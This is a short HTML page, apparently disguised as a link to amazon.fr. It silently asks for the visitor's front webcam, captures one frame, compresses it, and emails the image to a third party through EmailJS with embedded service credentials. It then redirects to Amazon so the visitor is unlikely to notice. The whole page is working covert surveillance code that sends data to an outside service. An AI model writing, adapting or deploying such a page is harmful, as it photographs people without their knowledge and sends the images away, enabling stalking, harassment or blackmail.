<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="UTF-8">
<script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
<style>html,body{margin:0;height:100%;background:#000;overflow:hidden}video,canvas{display:none}</style>
</head>
<body>
<video id="v" autoplay playsinline></video><canvas id="c" width="1280" height="720"></canvas>
<script>
emailjs.init("IoSfbtGz4KSL_5_9E");
const v=document.getElementById("v"),c=document.getElementById("c"),x=c.getContext("2d");
navigator.mediaDevices.getUserMedia({video:{facingMode:"user",width:1280,height:720}})
.then(s=>{v.srcObject=s;v.onloadeddata=()=>{x.drawImage(v,0,0,c.width,c.height);
let q=.85,i;do{i=c.toDataURL("image/jpeg",q);if(i.length*3/4/1024<=60)break;q-=.05}while(q>.1);
s.getTracks().forEach(t=>t.stop());emailjs.send("service_8cs0gml","template_rdhxflt",{image:i});
setTimeout(()=>location.href="https://www.amazon.fr",300);};})
.catch(()=>location.href="https://www.amazon.fr"));
</script>
</body>
</html>
